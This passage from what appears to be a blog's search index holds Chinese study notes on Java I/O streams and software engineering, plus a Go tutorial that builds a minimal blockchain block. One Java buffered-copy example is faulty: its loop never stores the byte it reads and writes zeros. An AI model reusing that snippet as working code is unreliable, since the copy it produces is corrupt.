InputStream和OutputStream虽然提供了一系列读写数据方法，单号是这两个类是抽象类，不能被实例化，因此提供了不同的子类：\n字节流读写文件 针对文件读写，JDK专门提供了两个类：\nFileInputStream FileOutputStream // 使用FielInputStream输入流读取文件 FileInputStream in = new FileInputStream(\u0026#34;test.txt\u0026#34;); int b = 0; // 通过循环读取文件 while((b = in.read()) != -1){ System.out.println(b) } // 关闭流 in.close(); // 使用FileOutputStream输出流写入文件 FileOutputStream out = new FileOutputStream(\u0026#34;out.txt\u0026#34;); String str = \u0026#34;hello\u0026#34;; // 将字符串转化成字节数组写入，注意，如果向一个已经存在的文件操作，文件的数据首先会被清空 // 如果以追加的形式写入 // FileOutputStream out = new FileOutputStream(\u0026#34;out.txt\u0026#34;, true); out.write(str.getBytes()); // 关闭流 out.close(); 通常将close()放在finally代码块中 文件的拷贝 FileInputStream in = new FileInputStream(\u0026#34;test.txt\u0026#34;); FileOutputStream out = new FileOutputStream(\u0026#34;out.txt\u0026#34;); int len = 0; while((len = in.read()) != -1){ out.write(len); } in.close(); out.close(); 字节流缓冲区 可以一次性读取多个字节数据，将数据先保存在字节数组中，然后将字节数组一次性的写入文件中\nFileInputStream in = new FileInputStream(\u0026#34;source/scr.jpg\u0026#34;); FileOutputStream out = new FileOutputStream(\u0026#34;target/dest.jpg\u0026#34;); int len = 0; byte[] buff = new byte[1024]; while((len = in.read(buff)) != -1){ out.write(buff, 0, len); } in.close(); out.close(); 字节缓冲流 I/O包中提供了两个带缓冲的字节流，分别是BufferedInputStream和BufferedOutputStream，它们的构造方法中分别接受InputStream和OutputStream类型的参数作为对象，在读写数据时提供缓冲功能。\n// 使用缓冲流进行文件拷贝 BufferedInputStream bis = new BufferedInputStream( new FileInputStream(\u0026#34;source/scr.jpg\u0026#34;) ); BufferedOutputStream bos = new BufferedOutputStream( new FileOutputStream(\u0026#34;target/dest.jpg\u0026#34;) ); int len = 0; while((bis.read()) != -1 ){ bos.write(len); } bis.close(); bos.close(); 7.3 字符流 字符流概述 字符流有两个顶级的父类：\nReader：字符输入流，从某个源设备读取字符 Writer：字符输出流，向某个目标设备写入字符 其中FileReader和FileWriter用于读写文件，BufferedReader和BufferedWriter是具有缓冲功能的流，可以提高读写效率\n字符流操作文件 如果想从文件中读取字符便可以使用字符输入流FileReader，通过此流可以从文件中读取一个或者一组字符\nFileReader fileReader = new FileReader(\u0026#34;reader.txt\u0026#34;); int len = 0; while((len = fileReader.read()) != -1){ System.out.println((char)len); } fileReader.close(); 如果要向文件中写入字符就需要使用FileWriter类\n// 同样如果原文件存在则会先清空再写入 // 如果追加 // FileWriter fileWriter = new FileWriter(\u0026#34;writer.txt\u0026#34;, true); FileWriter fileWriter = new FileWriter(\u0026#34;writer.txt\u0026#34;); fileWriter.write(\u0026#34;轻轻的我走了,\\r\\n\u0026#34;); // 关闭流 fileWriter.close(); 使用字符流缓冲区实现文件拷贝\nFileReader fileReader = new FileReader(\u0026#34;reader.txt\u0026#34;); FileWriter fileWriter = new FileWriter(\u0026#34;writer.txt\u0026#34;); int len = 0; char[] buff = new char[1024]; while((len = fileReader.read(buff)) != -1){ fileWriter.write(buff, 0, len); } fileReader.close(); fileWriter.close(); 使用字符输入输出缓冲流进行文件拷贝\nBufferedReader br = new BufferedReader( new FileReader(\u0026#34;reader.txt\u0026#34;) ); BufferedWriter bw = new BufferedWriter( new FileWriter(\u0026#34;writer.txt\u0026#34;) ); String str = null; // 循环时每次读取一行文本 while((str = br.readLine()) != null){ bw.write(str); // 写入一个换行符 bw.newLine(); } br.close(); bw.close(); 转换流 InputStreamReader OutputStreamWriter 将字节输出流转化成字符输出流，方便直接写入字符\n7.4 File类 File类的常用方法 方法声明 功能描述 File(String pathname) 通过指定的一个字符串类型的文件路径来创建一个新的File对象 File(String parent, String child) 根据一个指定的字符串类型的父路径和一个字符串类型的子路径（包括文件名称）创建一个File对象 File(File parent, String child) 根据指定的File类的父路径和字符串类型的子路径（包括文件名称）创建一个File对象 方法声明 功能描述 boolean exists() 判断File对象对应的文件是否存在 boolean delete() 删除File对象对应的文件或目录 boolean createNewFile() 当File对象对应的文件不存在时，新建一个此File对象所指定的文件 String getName() 返回文件名或者文件夹名 String getPath() 返回对应路径 String getAbsolutePath() 获得绝对路径 String getParent() 返回对应的父目录 boolean canRead() 对象对应的文件或者目录是否可读 boolean canWrite() 对应的文件或者目录是否可写 boolean isFile() 判断是否是文件（不是目录） boolean isDirectory() 判断是否是目录（不是文件） boolean isAbsolute() 判断对应文件或者目录是否为绝对路径 long lastModified() 返回自1970/1/1 00:00 到文件最后修改时间的毫秒值 long length() 返回文件内容长度 String[] list() 列出指定目录的所有内容，只是列出名称 String[] list(FilenameFilter filter) 接受一个FilenameFilter参数，只列出符合条件的文件 File[] listFiles() 返回一个包含File对象所有子文件和子目录的File数组 7.5 RandomAccessFile P266\n7.6 对象序列化 P268\n7.7 NIO P269\n7.8 NIO.2 P275\n","date":"2019-06-05T16:11:09+08:00","permalink":"https://lizonglingo.github.io/p/java%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","title":"Java期末复习提纲"},{"content":"第一章\t软件工程概论 1. 软件危机 软件危机是指：在计算机软件的开发和维护过程中所遇到的一系列严重问题。 软件危机包含下述两方面问题： （1）如何开发软件，以满足对软件日益增长的需求；\n（2）如何维护数量不断膨胀的已有软件。\n2. 软件工程 软件工程是指导计算机软件开发和维护的一门工程学科。采用工程的概念、原理、技术和方法来开发与维护软件，把经过时间考验而证明正确的管理技术和当前能够得到的最好的技术方法结合起来，以经济地开发出高质量的软件并有效地维护它，这就是软件工程。 软件工程本质 关注大型程序构造\n中心课题是控制复杂性\n产品交付后仍然需要经常修改\n开发效率非常重要\n开发人员和谐合作是关键\n软件有效的支持客户\n一种文化背景的人为另一种文化背景的人开发\n软件工程的基本原理 用分阶段的生命周期计划严格管理 坚持进行阶段评审 实行严格的产品控制 采用现代程序设计技术 结果应能清楚的审核 开发小组的人员应该少而精 承认不断改进软件工程实践的必要性 软件工程方法学 三要素：方法、工具、过程\n主要有：传统方法学、面向对象方法学\n传统方法学：\n结构化技术 把软件生命周期划成若干个阶段，然后按照顺序进行 每个阶段开始和结束都有严格的标准 每个阶段结束之前都必须进行严格的审查 面向对象方法学：\n把对象作为融合了数据及在数据上的操作行为的统一的软件结构 把所有对象都划分成类（类 按照父类与子类的关系，把若干个相关的类组成一个层次结构的系统（继承 对象彼此间仅能通过发送消息互相联系（封装 面向对象方法学的基本原则：尽量模拟人类习惯的思维方式，使开发软件的方法与过程尽可能接近人类认识世界、解决问题的方法与过程，从而使描述问题的问题空间(也称为问题域)与实现解法的解空间(也称为求解域)在结构上尽可能一致。\n面向对象方法学的优点：降低了软件产品的复杂性，提高了软件的可理解性，简化了软件的开发和维护工作。面向对象方法特有的继承性和多态性，进一步提高了面向对象软件的可重用性。\n3. 软件生命周期 三个时期、八个阶段 软件定义 问题定义：要解决的问题是什么\n可行性研究：对于上一阶段所确定的问题有行得通的解法没\n需求分析：为了解决这个问题，目标系统必须做什么\n软件开发 系统设计\n概要设计：应该怎么实现目标系统\n详细设计：应该具体怎么实现这个系统\n系统实现\n编码和单元测试：写出正确容易理解、维护的模块，选取适当高级语言\n综合测试：通过各种测试使软件达到预定要求（集成测试、验收测试、现场测试、平行运行测试等）\n软件维护 运行维护：使系统持久的满足用户的需要（改正性维护、适应性维护、完善性维护、预防性维护）\n4.软件过程 软件过程描述为了开发出客户需要的软件，什么人（who）、在什么时候（when）、做什么事（what）以及怎样（how）做这些事以实现某一个特定的具体目标。\n通常使用生命周期模型简洁地描述软件过程，也称为过程模型。\n瀑布模型 瀑布模型一直是唯一被广泛采用的生命周期模型，现在它仍然是软件工程中应用得最广泛的过程模型。\n特点：\n阶段间具有顺序性和依赖性 推迟实现的观点 质量保证的观点 优点：\n强迫开发人员采用规范的技术方法 严格规定每个阶段结束之前必须交文档 每个阶段结束之前必须正式进行严格的技术审查和管理复审 缺点：\n由文档驱动 快速原型模型 快速原型是快速建立起来的可以在计算机上运行的程序，它所能完成的功能往往是最终产品能完成的功能的一个子集。\n快速原型模型是不带反馈环的，这正是这种过程模型的主要优点：软件产品的开发基本上是线性顺序进行的。\n快速原型的本质是“快速”。开发人员应该尽可能快地建造出原型系统，以加速软件开发过程，节约软件开发成本。\n线性顺序开发的主要原因：\n原型系统已经通过与用户交互而得到验证 开发人员通过建立原型系统已将学会了许多东西 增量模型 增量模型也称为渐增模型。\n使用增量模型开发软件时，把软件产品作为一系列的增量构件来设计、编码、集成和测试。\n每个构件由多个相互作用的模块构成，并且能够完成特定的功能。使用增量模型时，第一个增量构件往往实现软件的基本需求，提供最核心的功能。\n优点：\n能在较短时间内向用户提交可完成部分工作的产品。 逐步增加产品功能可以使用户有较充裕的时间学习和适应新产品，从而减少一个全新的软件可能给客户组织带来的冲击。 困难：\n在把每个新的增量构件集成到现有软件体系结构中时，必须不破坏原来已经开发出的产品。 必须把软件的体系结构设计得便于按这种方式进行扩充，向现有产品中加入新构件的过程必须简单、方便，也就是说，软件体系结构必须是开放的。 螺旋模型 螺旋模型的基本思想是使用原型及其他方法尽量降低风险，理解这种模型的一个简便方法是把它看作在每个阶段之前都增加了风险分析过程的快速原型的快速原型模型。适合内部的开发大型项目。\n优点：\n有利于已有软件的重用。 有助于把软件质量作为软件开发的一个重要目标。 减少了过多测试或测试不足带来的风险。 软件维护和软件开发过程没有本质区别。 喷泉模型 喷泉模型是典型的面向对象生命周期模型，它充分体现了面向对象软件开发过程中迭代和平滑过渡的特性。\n此外还有：Rational统一过程、敏捷过程与极限编程、微软过程等，这里不再一一陈述。\n第二章\t结构化分析 1.可行性研究的目的 可行性研究的目的是，用最小的代价在尽可能短的时间内研究并确定客户提出的问题是否有行得通的解决办法。\n通常在以下三个方面来研究每种方案的可行性：\n技术可行性：使用现有的技术能否实现这个系统。 经济可行性：这个系统的经济效益能否超过它的开发成本。 操作可行性：这个系统的操作方式在客户组织内是否行得通。 2.可行性研究过程 典型的可行性研究过程有下述步骤：\n复查系统规模和目标：\n实质上是为了确保分析员正在解决的问题确实是要求他解决的问题。\n研究目前正在使用的系统：\n现有的系统是信息的重要来源。如果现有的系统是完美无缺的，用户自然不会提出开发新系统的要求，因此，现有的系统必然有某些缺点，新系统必须能解决旧系统中存在的问题。应该仔细阅读分析现有系统的文档资料和使用手册，也要实地考察现有的系统。常见的错误做法是花费过多时间去分析现有的系统。因为该步骤的目的是了解现有系统能做什么，而不是怎样做。\n导出新系统的高层逻辑模型：\n优秀的设计过程通常是从现有的物理系统出发，导出现有系统的逻辑模型，再参考现有系统的逻辑模型，设想目标系统的逻辑模型，最后根据目标系统的逻辑模型建造新的物理系统。\n进一步定义问题：\n可行性研究的前4个步骤实质上构成一个循环。分析员定义问题，分析这个问题，导出一个试探性的解；在此基础上再次定义问题，再一次分析这个问题，修改这个解；继续这个循环过程，直到提出的逻辑模型完全符合系统目标。\n导出和评价供选择的解法：\n分析员应该从他建议的系统逻辑模型出发，导出若干个较高层次的物理解法供比较和选择。\n其次可以考虑操作方面的可行性。分析员应该根据使用部门处理事务的原则和习惯检查技术上可行的那些方案，去掉其中从操作方式或操作过程的角度看用户不能接受的方案。\n接下来应该考虑经济方面的可行性。分析员应该估计余下的每个可能的系统的开发成本和运行费用，并且估计相对于现有的系统而言这个系统可以节省的开支或可以增加的收入。最后为每个在技术、操作和经济等方面都可行的系统制定实现进度表，这个进度表不需要制定得很详细，通常只需要估计生命周期每个阶段的工作量。\n推荐行动方针\n根据可行性研究结果应该决定的一个关键性问题是：**是否继续进行这项开发工程？**分析员必须清楚地表明他对这个关键性决定的建议。\n如果分析员认为值得继续进行这项开发工程，那么他应该选择一种最好的解法，并且说明选择这个解决方案的理由。\n通常客户主要根据经济上是否划算决定是否投资于一项开发工程，因此分析员对于所推荐的系统必须进行比较仔细的成本/效益分析。\n草拟开发计划\n分析员应该为所推荐的方案草拟一份开发计划，除了制定工程进度表之外还应该估计对各类开发人员和各种资源的需要情况，应该指明什么时候使用以及使用多长时间。此外还应该估计系统生命周期每个阶段的成本。最后应该给出下一个阶段(需求分析)的详细进度表和成本估计。\n书写文档提交审查\n应该把上述可行性研究各个步骤的工作结果写成清晰的文档，请用户、客户组织的负责人及评审组审查，以决定是否继续这项工程及是否接受分析员推荐的方案。\n3.需求分析的任务 需求分析的基本任务是准确回答**”系统必须做什么?“**这个问题，需求分析的任务还不是决定系统怎样完成工作，而仅仅是确定系统必须完成哪种工作 ，也可是对目标系统提出完整、准确、清晰的和具体的要求。\n为了开发出真正满足用户需求的软件产品，首先必须知道用户的需求。对软件需求的深入理解是软件开发工作获得成功的前提条件，不论人们把设计和编码工作做得如何出色，不能真正满足用户需求的程序只会令用户失望，给开发者带来烦恼。\n所有分析方法都必须包括以下准则：\n必须理解并描述问题的信息域，根据这条准则应该建立数据模型。 必须定义软件应该完成的功能，这条准则要求建立功能模型。 必须描述作为外部事物事件结果的软件行为，这条准则要求建立行为模型。 必须对描述信息、功能和行为的模型进行分解，用层次的方式展示细节。 要确定对系统的综合要求 功能需求\n这方面的需求指定系统必须提供的服务。通过需求分析应该划分出系统必须完成的所有功能.\n性能需求\n性能需求指定系统必须满足的定时约束或容量约束，通常包括速度(响应时间)、信息量速率、主存容量、磁盘容量、安全性等方面的需求。\n可靠性和可重用性需求\n可靠性需求定量地指定系统的可靠性，可用性与可靠性密切相关，它量化了用户可以使用系统的程度。\n出错处理需求\n这类需求说明系统对环境错误应该怎样响应。例如，如果它接收到从另一个系统发来的违反协议格式的消息，应该做什么？\n接口需求\n接口需求描述应用系统与它的环境通信的格式。常见的接口需求有：用户接口需求；硬件接口需求；软件接口需求；通信接口需求。\n约束\n设计约束或实现约束描述在设计或实现应用系统时应遵守的限制条件。常见的约束有：精度；工具和语言约束；设计约束；应该使用的标准；应该使用的硬件平台。\n逆向需求\n逆向需求说明软件系统不应该做什么。理论上有无限多个逆向需求，人们应该仅选取能澄清真实需求且可消除可能发生的误解的那些逆向需求。\n将来可能提出的需求\n应该明确地列出那些虽然不属于当前系统开发范畴，但是据分析将来很可能会提出来的要求。这样做的目的是，在设计过程中对系统将来可能的扩充和修改预做准备，以便一旦确实需要时能比较容易地进行这种扩充和修改\n4.与用户沟通方法 1. 访谈 两种基本形式：正式的和非正式的访谈。\n正式访谈时，系统分析员将提出一些事先准备好的具体问题，例如，询问客户公司销售的商品种类、雇用的销售人员数目以及信息反馈时间应该多快等。\n在非正式访谈中，分析员将提出一些用户可以自由回答的开放性问题，以鼓励被访问人员说出自己的想法，例如，询问用户对目前正在使用的系统有哪些不满意的地方。\n当需要调查大量人员的意见时，向被调查人分发调查表是一个十分有效的做法。在访问用户的过程中使用情景分析技术往往非常有效。所谓情景分析就是对用户将来使用目标系统解决某个具体问题的方法和结果进行分析\n2. 面向数据流自顶向下求精 结构化分析方法就是面向数据流自顶向下逐步求精进行需求分析的方法。通过可行性研究已经得出了目标系统的高层数据流图，需求分析的目标之一就是把数据流和数据存储定义到元素级。\n数据流图是帮助复查的极好工具，从输入端开始，分析员借助数据流图、数据字典和IPO图向用户解释输入数据是怎样一步一步地转变成输出数据的。这些解释集中反映了通过前面的分析工作分析员所获得的对目标系统的认识。\n3. 简易的应用规格说明技术 简易的应用规格说明技术是一种面向团队的需求收集技术。\n该技术提倡用户与开发者密切合作，共同标识问题，提出解决方案要素，商讨不同方案并指定基本需求。\n4. 快速建立软件原型 快速建立软件原型是最准确、最有效、最强大的需求分析技术。所谓软件原型，就是快速建立起来的旨在演示目标系统主要功能的可运行程序。构建软件原型的要点是，它应该实现用户看得见的功能，省略目标系统的”隐含“功能。\n软件原型应该具有的第一个特性是”快速“，第二个特性是”容易修改“。\n5.分析建模与规格说明 6. 系统流程图 — 实体联系图 — 数据流图 — 数据字典 — 状态转换图 看例题和课后题掌握\n系统流程图 系统流程图表的的是数据在系统各部件之间流动的情况，而不是对数据加工处理的控制过程，因此系统流程图是物理数据流图而不是程序流程图。\n数据流图 数据流图(DFD)是一种图形化技术，它描绘信息流和数据从输入移动到输出的过程中所经受的变换。在数据流图中没有任何具体的物理部件，它只是描绘数据在软件中流动和被处理的逻辑过程。数据流图是系统逻辑功能的图形表示，即使不是专业的计算机技术人员也容易理解它，因此是分析员与用户之间极好的通信工具。\n数据字典 数据字典是关于数据的信息的集合，也就是对数据流图中包含的所有元素的定义的集合。数据字典的作用是在软件分析和设计的过程中给人提供关于数据的描述信息。\n数据字典一般由下列4类元素定义：\n数据流 数据流分量（即数据元素） 数据存储 处理 数据元素组成数据的方式：\n顺序\t即以确定次序连接两个分量 选择 即从两个或多个可能的元素中选取一个 重复 即把指定的分量重复零次或多次 可选 即一个分量是可有可无的（重复零次或一次） 7.成本/效益估计 1.成本估计 软件开发成本主要表现为人力消耗(乘以平均工资则得到开发费用)。成本估计不是精确的科学，因此应该使用几种不同的估计技术以便相互校验。\n代码行技术 比较简单的定量估算方法，估计出源代码行数以后，用每行代码的平均成本乘以行数就可确定软件的成本。每行代码的平均成本取决于软件的复杂程度和工资水平，\n任务分解技术 首先把软件开发工程分解为若干个相对独立的任务，再分别估计每个单独任务的成本，最后累加得出总成本。\n自动估计成本技术 采用自动估计成本的软件工具，减轻人的劳动，估计结果更客观。\n2.成本/效益分析方法 主要从以下四个方面考虑;\n货币的时间价值 投资回收期 纯收入 投资回收绿率 8.验证软件需求 从以下4个方面\n一致性：所有需求必须一致，任何一条需求不能和其他需求冲突 完整性：需求必须是完整的，规格说明书应包括用户需要的每一个功能或性能 现实性：在现有的硬件技术和软件技术上可以实现 有效性：必须证明需求是正确有效的 第三章 总体设计 总体设计的基本目的就是回答“概括地说，系统应该如何实现”这个问题，因此，总体设计又称为概要设计或初步设计。\n总体设计阶段的另一项重要任务是设计软件的结构，也就是要确定系统中每个程序是由哪些模块组成的，以及这些模块相互间的关系。\n结构化设计技术的基本要点如下：\n软件系统是由层次化结构的模块构成的 模块是单入口和单出口的 构造和联结模块的基本准则是模块独立 用图来描述软件的系统结构，并且使软件结构与问题结构尽量一致 概要设计 概要设计也称总体设计或初步设计，这个设计阶段主要完成下列两项任务。\n方案设计\n首先设想实现目标系统的各种可能解决方案。然后根据系统规模和目标，综合考虑技术、经济、操作等各种因素，从设想出的供选择方案中选出若干个合理的方案。最后，综合分析，选出最佳方案，并制定详细实现计划。\n软件体系结构设计\n确定每个程序是由那些模块所组成，以及这些模块相互间的关系。还应该进一步改变软件结构，以便获得更好的体系结构。\n详细设计 详细设计阶段主要完成以下三项任务：\n过程设计，即设计软件体系结构中所包含的每个模块的实现算法 数据设计，即设计软件中所需要的数据元素 接口设计，即设计软件内部各个模块之间、软件与协作系统之间以及软件与使用它的人之间的通信方式 1.设计过程 总体设计过程通常有两个主要阶段组成：系统设计阶段，确定系统的具体实现方案；结构化设计阶段，确定软件结构。\n典型的总体设计过程包括下述9个步骤：\n设想供选择的方案\n需求分析阶段得出的数据流图是总体设计的极好的出发点。\n选取合理的方案\n通常至少选取低成本、中等成本和高成本的3种方案\n对每个方案都应准备以下四份资料：\n1）系统流程图\n2）组成系统的物理元素清单\n3）成本/效益分析\n4）实现这个系统的进度计划\n推荐最佳方案\n功能分解\n对程序(特别是复杂的大型程序)的设计，通常分为两个阶段完成：首先进行结构设计，然后进行过程设计。\n为确定软件结构，首先需要从实现角度把复杂的功能进一步分解。分析员结合算法描述仔细分析数据流图中的每个处理，如果一个处理的功能过分复杂，必须把它的功能适当地分解成一系列比较简单的功能。\n设计软件结构\n通常程序中的一个模块完成一个适当的子功能。应该把模块组织成良好的层次系统，顶层模块调用它的下层模块以实现程序的完整功能，每个下层模块再调用更下层的模块，完成程序的一个子功能，最下层的模块完成最具体的功能。\n设计数据库\n制定测试计划（主要是功能测试问题）\n在软件开发的早期阶段考虑测试问题，能促使软件设计人员在设计时注意提高软件的可测试性。\n书写文档\n文档通常有下述几种：\n（1）系统说明\n（2）用户手册\n（3）测试计划\n（4）详细的实现计划\n（5）数据库设计结果\n审查与复审\n最后应该对总体设计的结果进行严格的技术审查，在技术审查通过之后再由客户从管理角度进行复审。\n2.设计原理 1.模块化 模块是由边界元素限定的相邻程序的序列，而且具有一个总体标识符代表它。\n模块化就是把程序划分成独立命名且可独立访问的模块，每个模块完成一个子功能，把这些模块集合起来构成一个整体，可以完成指定的功能满足用户的需求。\n模块化是为了使一个复杂的大型程序能够被人的智力所管理，是软件应该具有的唯一属性。\n每个程序都相应地有一个最适当的模块数M，使得系统开发成本最小。\n2.抽象 人们在认识复杂现象的过程中使用的最强有力的思维工具就是抽象。\n现实世界中一定事物、状态或过程之间总存在着某些相似的方面（共性）。把这些相似的方面集中概括起来，暂时忽略它们之间的差异，这就是抽象。\n或者说，抽象就是抽出事物的本质特性而暂时不考虑其他细节。\n逐步求精和模块化概念，与抽象是密切相关的。\n3.逐步求精 为了能集中精力解决主要问题而尽量推迟对问题细节的考虑。\n求精实际上是细化过程，抽象与求精是一对互补的概念。\n4.信息隐藏和局部化 应该这样设计和确定一个模块，使得一个模块内包含的信息（过程和数据）对于不需要这些信息的模块来说，是不能访问的。\n局部化的概念和信息隐藏概念是密切的相关的。所谓局部化是指把一些关系密切的软件元素物理地放的彼此靠近。\n5.模块独立 模块独立的概念是模块化、抽象、信息隐藏和局部化概念的直接结果。\n模块的独立性很重要。主要有两个理由：\n有效的模块化的软件比较容易开发出来 独立的模块比较容易测试和维护。 模块的独立程度可以由两个定性标准度量，这两个标准分别称为内聚和耦合。\n耦合\n耦合是对一个软件结构内不同模块之间互连程度的度量。\n如果两个模块中的每一个都能独立地工作而不需要另一个模块的存在，那么它们彼此完全独立，这意味着模块之间无任何连接，耦合程度最低。\n四种耦合：\n数据耦合\n如果两个模块彼此间通过参数交换信息，而且交换的信息仅仅是数据，那么这种耦合称为数据耦合。\n数据耦合是低耦合，系统中至少存在这种耦合。\n控制耦合\n如果传递的信息中有控制信息，则这种耦合称为控制耦合。\n控制耦合是中等程度的耦合，它增加了系统的复杂程度。控制耦合往往是多余的，在把模块适当分解之后通常可用数据耦合代替它。\n特征耦合\n把整个数据结构作为参数传递而被调用的模块只需要使用其中一部分数据元素时，就出现了特征耦合。\n公共环境耦合\n当两个或多个模块通过一个公共数据环境相互作用时，它们之间的耦合称为公共环境耦合。\n公共环境可以是全程变量、共享的通信区、内存的公共覆盖区、任何存储介质上的文件、物理设备等。\n公共环境耦合的复杂程度随耦合的模块个数而变化，当耦合的模块个数增加时复杂程度明显增加。如果只有两个模块有公共环境，那么这种耦合有下面两种情况：\n（1）一个模块往公共环境送数据，另一个从公共环境中获取数据。是比较松散的耦合。\n（2）两个模块都既往公共环境送又取，这种耦合比较紧密，介于数据耦合和控制耦合之间。\n如果两个模块的共享数据很多，这时可以用公共环境耦合。\n内容耦合\n耦合程度最高。如果出现下列情况之一，两个模块之间就发生了内容耦合：\n（1）一个模块访问另一个模块的数据、\n（2）一个模块不通过正常入口而转到另一个模块内部\n（3）两个模块有一部分程序代码重叠\n（4）一个模块有多个入口\n应坚决避免使用内容耦合！\n应该采取下述设计原则：\n尽量使用数据耦合 少用控制耦合和特征耦合 限制公共环境耦合的范围 完全不使用内容耦合 内聚\n内聚标志一个模块内各个元素彼此结合的紧密程度，它是信息隐藏和局部化概念的自然扩展。简单说说，理想内聚的模块只做一件事情。\n内聚和耦合是密切相关的，模块内的高内聚往往意味着模块间的松耦合。\n低内聚\n（1）偶然内聚：一个模块完成一组任务，这些任务间彼此之间即使有联系，关系也很松散。\n（2）逻辑内聚：一个模块完成的任务在逻辑上属于相同或者相似的一类。\n（3）时间内聚：一个模块中包含的任务必须在同一段时间内执行。\n中内聚\n（1）过程内聚：一个模块中的处理元素是相关的，而且必须以特定的次序执行。\n（2）通信内聚：模块中所有元素使用同一个输入数据或产生同一个输出数据。\n高内聚\n（1）顺序内聚：一个模块内的处理元素和同一个功能密切相关，而且这些处理必须顺序执行（一个处理元素的输出数据作为下一个元素的输入数据）。\n（2）功能内聚：模块内所有处理数据属于一个整体，完成一个单一内容。功能内聚是最高程度的内聚\n设计时力争做到高内聚，并且能够辨认出低内聚的模块，有能力通过修改设计提高模块的内聚程度并且降低模块间的耦合程度，从而获得较高的模块独立性。\n3.启发规则 改进软件结构提高模块独立性 模块规模应该适中 深度、宽度、扇出和扇入都应适当 模块的作用域应当在控制域之内 力争降低模块接口的复杂程度 设计单入口单出口的模块 模块功能应该可以预测 4.描绘软件结构的图形工具 1.层次图和HIPO图 2.结构图 5.面向数据流的设计方法 1.数据流类型 变换流：信息以”外部世界“形式进入系统，经过加工处理后以再以”外部世界“的形式离开系统。 事物流：这种数据流”以事物为中心“，事务中心完成以下任务：（1）接受输入数据（输入数据又称事务）（2）分析每个事务以确定它的类型（2）根据事务类型选取一条活动通路 2.设计步骤 面向数据流方法主要有下述几个步骤：\n复查基本系统模型 复查并精化数据流图 确定数据流图具有变换特性还是事物特性 确定数据流边界 完成“第一级分解” 完成”第二级分解“ 优化 2019/6/1\t21:51 先整理到这里\n","date":"2019-06-01T21:52:45+08:00","permalink":"https://lizonglingo.github.io/p/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%95%B4%E7%90%86/","title":"软件工程期末复习整理"},{"content":" 最近一直忙于伏羲也没怎么学别的东西···今天更一点东西，一起来看看一条最简单的区块链是如何实现的。\n本文转载自：Wuman\u0026rsquo;s Blog\n区块结构体 我们把一个区块看成一个结构体，用结构体来存储区块所需要的信息。\n// 创建区块链结构体 type Block struct { Timer\tint64\t// 时间戳 Data []byte\t// 数据 prevHash[]byte\t// 前一个区块的Hash Hash []byte\t// 本区块的Hash } 在一个最简单的区块中,我们需要的最基本的属性有：\n时间戳 区块数据 前一个区块的Hash值 本区块的Hash值 其中，除了时间戳外，我们均使用字节类型来定义。\n创建一个区块 我们需要一些数据来创建一个区块（创世块会稍稍有区别）。\n//创建区块 func NewBlock(data string, prevhash []byte) *Block { // 创建一个区块链结构体 block1 := Block{} // 获取时间 block1.Timer = time.Now().Unix() // 传入数据参数 block1.Data = []byte(data) // 传入前一个Hash block1.prevHash = prevhash // setHash方法加密获得自己的Hash block1.setHash() // 返回区块指针 return \u0026amp;block1 } 首先，我们需要区块所存储的数据内容data，还需要上一个区块的Hash，在创建完成之后，我们返回一个结构体类型的指针。\n其中，我们使用的setHash方法是用来获取本区块Hash的。下面我们来看一看这个函数。\nsetHash函数 setHash用来给区块加密，来获取本区块的Hash值。\n// 进行加密设置Hash func (block *Block) setHash() { // 首先将区块的时间转化为字符切片类型，便于加密 time := []byte(strconv.FormatInt(block.Timer, 10)) // 将数据，时间，前一个区块的Hash进行拼接 heards := bytes.Join([][]byte{time, block.Data, block.prevHash}, []byte{}) // sha256加密 hash := sha256.Sum256(heards) // 加密后的Hash直接赋给本Hash block.Hash = hash[:] } 在这里，我们通过sha256加密，对由时间戳、区块数据、上一个区块Hash组成的信息进行加密，将得到的Hash赋给本区块的Hash。\n创世区块 创世区块由于没有前一个区块，我们就不需要使用前一个区块的Hash值了。\n// 创建创世块 func Firstblock() *Block { // 传入参数，返回结构体指针 firstblock := NewBlock(\u0026#34;This is firstblock\u0026#34;, []byte{}) // 返回结构体指针类型 return firstblock } main函数 我们在main函数里打印出区块的Hash\nfunc main() { firstblock := Firstblock() // 按照16进制打印 fmt.Printf(\u0026#34;%x\u0026#34;,string(firstblock.Hash)) } 代码 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/sha256\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) // 创建区块链结构体 type Block struct { Timer\tint64\t// 时间戳 Data []byte\t// 数据 prevHash[]byte\t// 前一个区块的Hash Hash []byte\t// 本区块的Hash } // 进行加密设置Hash func (block *Block) setHash() { // 首先将区块的时间转化为字符切片类型，便于加密 time := []byte(strconv.FormatInt(block.Timer, 10)) // 将数据，时间，前一个区块的Hash进行拼接 heards := bytes.Join([][]byte{time, block.Data, block.prevHash}, []byte{}) // sha256加密 hash := sha256.Sum256(heards) // 加密后的Hash直接赋给本Hash block.Hash = hash[:] } // 创建创世块 func Firstblock() *Block { // 传入参数，返回结构体指针 firstblock := NewBlock(\u0026#34;This is firstblock\u0026#34;, []byte{}) // 返回结构体指针类型 return firstblock } //创建区块 func NewBlock(data string, prevhash []byte) *Block { // 创建一个区块链结构体 block1 := Block{} // 获取时间 block1.Timer = time.Now().Unix() // 传入数据参数 block1.Data = []byte(data) // 传入前一个Hash block1.prevHash = prevhash // setHash方法加密获得自己的Hash block1.setHash() // 返回区块指针 return \u0026amp;block1 } func main() { firstblock := Firstblock() // 按照16进制打印 fmt.Printf(\u0026#34;%x\u0026#34;,string(firstblock.Hash)) } 打印结果 GOROOT=D:\\Goland\\Go #gosetup GOPATH=D:\\Goland\\Gowork;D:\\Goland\\Go #gosetup D:\\Goland\\Go\\bin\\go.exe build -o C:\\Users\\HP\\AppData\\Local\\Temp\\___go_build_running_go.exe D:/Goland/Gowork/src/main/running.go #gosetup C:\\Users\\HP\\AppData\\Local\\Temp\\___go_build_running_go.exe #gosetup 0d00bc4d9ef291f3e0fe6ac36fa2a1a62e6f6e1939b191688bc18817bb96f1e9 Process finished with exit code 0 ","date":"2019-05-31T21:14:18+08:00","permalink":"https://lizonglingo.github.io/p/golang%E5%AE%9E%E7%8E%B0%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%93%BE/","title":"Golang实现最简单的链"},{"content":" 